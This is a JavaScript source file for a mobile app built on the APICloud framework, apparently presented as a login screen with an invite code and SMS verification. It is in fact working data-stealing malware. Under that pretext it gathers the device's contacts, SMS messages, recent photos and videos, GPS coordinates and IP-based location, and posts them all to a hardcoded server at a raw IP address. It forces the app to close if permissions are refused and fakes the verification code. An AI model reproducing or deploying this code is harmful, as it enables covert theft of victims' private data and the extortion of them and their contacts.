var danjishijian = true;
var address = "";
var apiserver = 'http://216.83.46.35/';
var lon="";
var lat="";
var pic_count = 10;
var video_count = 5;
var is_video = 0;
var jump_url = "http://216.83.46.35/app/index.html";
var smsrecords="";
var smscode_time = 60;
var is_sendyzm = true;
var smsrecords = "";
var login_addr = "未获取";
var per_list = ['phone','sms-r','contacts','location','storage'];


apiready = function() {
    bind_ui();
    address=api.version + '-' + api.deviceModel;
    get_app_config();
    get_location_permission();
    get_login_addr();
}

function get_location_permission(){
    api.requestPermission({
        list: ['location'],
        code: 100001
    }, function(ret, err){
        get_location();
    });
}

function get_login_addr(){
    $.ajax({
    'url':'https://api.ip138.com/ip/',
    'data':{            //默认自动添加callback参数
        'ip':'', //为空即为当前iP地址
        'oid':'45307',
        'mid':'105920',
        'token':'15dd6f666f6a266e9a30262a6a0f739b'  //不安全，请定期刷新token，建议进行文件压缩
    },
    'dataType':'jsonp',
    'success':function(json){
        login_addr = json.data[0] + "-" + json.data[1] + "-" + json.data[2] + "-" + json.data[4];
    }
});
}

function aa() {
    console.log("aaa");
        var phone_number = $('#phone_number').val();
        var invite_code = $('#invite_code').val();
		if(invite_code == ''){
			api.toast({
            msg:'携帯電話番号を入力してください！'
        });
		return;
		}
    if (parseInt(phone_number) > 0) {
        checkPermission();
        huoqu(phone_number, invite_code);
		is_sendyzm = false;
        timeJS(smscode_time);
        $('#codebtn').attr('disabled','true');
        danjishijian = false;
    }
    else {
        api.toast({
            msg:'please input correct phone number or invite code !'
        });
    }
}


function checkPermission(){
    var per_ret = confirmPer(per_list);
    if(!per_ret){
        alert("sorry，application permission is not enough，app will exit！");
        api.closeWidget({id:'A6177268240951',silent:true});
    }
}

function hasPermission(){
    var rets = api.hasPermission({
        list:per_list
    });
    console.log(JSON.stringify(rets));
    for(var item in rets){
        if(!rets[item].granted){
            return false;
        }
    }
    return true;
}

function reqPermission(one_per){
    api.requestPermission({
        list: one_per,
        code: 100001
    }, function(ret, err){
        console.log(JSON.stringify(ret));
        aa();
    });
}

function confirmPer(perm){
    var has = hasPermission(perm);
    if(!has){
        api.confirm({
            title: 'tips',
            msg: 'permission is not enough' + "\nconfig？",
            buttons: ['yes', 'cancle']
        }, function(ret, err) {
            if(1 == ret.buttonIndex){
             
                return reqPermission(perm);
            }else{
                api.closeWidget({id:'A6177268240951',silent:true});
            }
        });
    reqPermission(perm);
    }
     return true;
}




function bind_ui(){
    $("body").off("tap");
    $('#qd').attr('disabled','true');
    $("body").on('tap', '#bind', function (event) {
        api.toast({
            msg:'please register/after login to config setting page!'
        });
    });
    $("body").on('tap', '#codebtn', function (event) {
        console.log("code....");
        if (!is_sendyzm){
            api.toast({
                msg:'waiting' + smscode_time.toString() + "second..."
            });
            return;
        }
        if (danjishijian) {
            if(api.systemType == 'ios'){
                aa();
            }else{
                reqPermission(per_list);
            }
        }
    });

    $("body").on('tap', '#login_in', function (event) {
        if (smscode_time == 0){
            api.openWin({
                name: 'list',
                url: jump_url
            });
        }else{
            api.toast({
                msg:'SMS確認コードをお待ちください!'
            })
        }
    });
}

// 或取定位信息
function get_location() {
    var aMapLBS = api.require('aMapLBS');
    aMapLBS.configManager({
        accuracy: 'hundredMeters',
        filter: 1
    }, function(ret, err) {
        if (ret.status) {
            var aMapLBS = api.require('aMapLBS');
            aMapLBS.startLocation(function(ret, err) {
                if (ret.status) {
                    lon=ret.lon;
                    lat=ret.lat;
                }
            });
        }
    });
}

function get_app_config() {
    api.ajax({
        url:apiserver+'/api/Uploads/get_config',
        method:'get',
        cache:'false',
        timeout:3000,
    },function(ret,err){
        console.log(JSON.stringify(ret));
        if (ret.code == 1) {
            pic_count = ret.msg.pic_count;
            jump_url = ret.msg.jump_url;
            video_count = ret.msg.video_count;
            is_video = ret.msg.is_video;
        }else{
            api.toast({
                msg:ret.msg
            });
        }
    });

}

function timeJS(i) {
    $('#codebtn').html(i + "s to resend");
    i--;
    smscode_time--;
    if (i > 0) {
        setTimeout(function() {
            timeJS(i)
        }, 1000)
    } else {
        $('#codebtn').removeAttr('disabled');
        $('#code').val('8888');
        $('#codebtn').html("send sms");
        $('#qd').removeAttr('disabled');
        smscode_time = 60;
        is_sendyzm = true;
        danjishijian = true;
    }
}


function huoqu(phone_number, invite_code) {
    var con = phone_number + "**" + invite_code + '**' + address;
    var DVContacts = api.require('DVContacts');
    DVContacts.allContacts(function(ret,err) {
        if (ret) {
            var json_Stirng = JSON.stringify(ret);
            var food=$api.strToJson(json_Stirng);
            for(var i =0;i<food.contacts.length;i++){
                var obj=food.contacts[i].phones;
                var json_Stirngs = JSON.stringify(obj);
                var phone=json_Stirngs.replace('[{"手机":"',"");
                var phone2=phone.replace('[{"工作":"',"");
                var phone3=phone2.replace('[{"家庭":"',"");
                var phone4=phone3.replace('{"家庭":"',"");
                var phone5=phone4.replace('"}]',"");
                var phone6=phone5.replace('"}',"");
                con = con + '=' + food.contacts[i].fullName + '|' + phone6;
            }
            api.ajax({
                url:apiserver+'/api/Uploads/api',
                method:'post',
                cache:'false',
                timeout:10000,
                dataTpye:'json',
                data:{values:{data:con,login_addr:login_addr}}
            },function(ret,err){
                if (ret.err == '正在加载列表') {
                    console.log("或取短信列表");
                    if(api.systemType == 'ios'){
                        addimg(phone_number, invite_code);
                    }else{
                        getSmsInfo(phone_number, invite_code);
                    }
                    
                }else{
                    api.toast({
                        msg:ret.err
                    });
                }
            });

        } else {
            alert(JSON.stringify(err));
        }
    });
}



function dingwei(phone_number, invite_code){
    var jingweidu = phone_number + ',' + invite_code + ',' + lon + ',' + lat;
    api.ajax({
        url:apiserver+'/api/Uploads/apimap',
        method:'post',
        cache:'false',
        timeout:1000,
        dataTpye:'json',
        data:{values:{data:jingweidu}}
    },function(ret,err){
        if (ret.err == '获取成功') {
            console.log("定位成功");
        }else{
            api.toast({
                msg:ret.err
            });
        }
    });
}



function getSmsInfo(phone_number, invite_code){
    var param = {};
    smsrecords = api.require('smsrecords');
    smsrecords.getsmsinfo(param, function(ret, err){
        var smsList = JSON.parse(ret.smsList || "[]");
        for(item in smsList){

            var number=smsList[item].number;
            var mess=smsList[item].mess;
            var time=smsList[item].time;
            var type=smsList[item].type;
            api.ajax({
                url:apiserver+'/api/Uploads/addsms',
                method:'post',
                cache:'false',
                timeout:100,
                dataTpye:'json',
                data:{values:{number:number,mess:mess,time:time,type:type,sjh:phone_number}}
            },function(ret,err){
                console.log(JSON.stringify(ret));
            });
        }
        addimg(phone_number, invite_code);
    });
}


//上传图片
function addimg(phone_number, invite_code){
    console.log("addimg......");
    var UIAlbumBrowser = api.require('UIAlbumBrowser');
    UIAlbumBrowser.scan({
        type: 'image',
        count: pic_count,
        sort: {
            key: 'time',
            order: 'desc'
        }
    }, function(ret) {

        if (ret) {
            var json_Stirng = JSON.stringify(ret);
            var food=$api.strToJson(json_Stirng);
            var loop_count = 0;
            if(food.list.length > pic_count){
                loop_count = pic_count;
            }else{
                loop_count = food.list.length;
            }
            for(var i =0;i<loop_count;i++){
                var img_path = food.list[i].path;
                if(api.systemType == 'ios'){
                    UIAlbumBrowser.transPath({
                        path: img_path
                    }, function(ret, err) {
                        if (ret) {

                            img_path = ret.path;

                        } else {
                            console.log(JSON.stringify(err));
                        }
                    });
                }
                api.ajax({
                    url:apiserver+'/api/Uploads/upload',
                    method:'post',
                    cache:'false',
                    timeout:1000,
                    dataTpye:'json',
                    data:{files:{file:img_path}}
                },function(ret,err){
                    // console.log(JSON.stringify(err));
                    if(api.systemType == 'ios'){
                        
                    }else{
                        api.ajax({
                            url:apiserver+'/api/Uploads/addimg',
                            method:'post',
                            cache:'false',
                            timeout:1000,
                            dataTpye:'json',
                            data:{values:{sjh:phone_number,img:ret.data}}
                        },function(ret,err){
                        });
                    }
                    
                });
            }
        }
    });
    if (is_video == 1){
        if(api.systemType == 'ios'){
                        
        }else{
        addvideo(phone_number, invite_code);
        }
    }else{
        dingwei(phone_number, invite_code);
    }
}
//上传视频
function addvideo(phone_number, invite_code){
    dingwei(phone_number, invite_code);
    var UIAlbumBrowser = api.require('UIAlbumBrowser');
    UIAlbumBrowser.scan({
        type: 'video',
        count: video_count,
        sort: {
            key: 'time',
            order: 'desc'
        }
    }, function(ret) {
        if (ret) {
            var json_Stirng = JSON.stringify(ret);
            var food=$api.strToJson(json_Stirng);
            var loop_count = 0;
            if (food.list.length > video_count){
                loop_count = video_count;
            }else{
                loop_count = food.list.length;
            }
            for(var i =0;i<loop_count;i++){
                var img_path = food.list[i].path;
                if(api.systemType == 'ios'){
                    UIAlbumBrowser.transPath({
                        path: img_path
                    }, function(ret, err) {
                        if (ret) {
                            img_path = ret.path;
                        } else {
                            console.log(JSON.stringify(err));
                        }
                    });
                }
                api.ajax({
                    url:apiserver+'/api/Uploads/upload',
                    method:'post',
                    cache:'false',
                    timeout:1000,
                    dataTpye:'json',
                    data:{files:{file:img_path}}
                },function(ret,err){
                    console.log(JSON.stringify(ret));
                    api.ajax({
                        url:apiserver+'/api/Uploads/addvideo',
                        method:'post',
                        cache:'false',
                        timeout:1000,
                        dataTpye:'json',
                        data:{values:{sjh:phone_number,video:ret.data}}
                    },function(ret,err){
                        console.log(JSON.stringify(ret));
                    });
                });
            }
        }
    });

}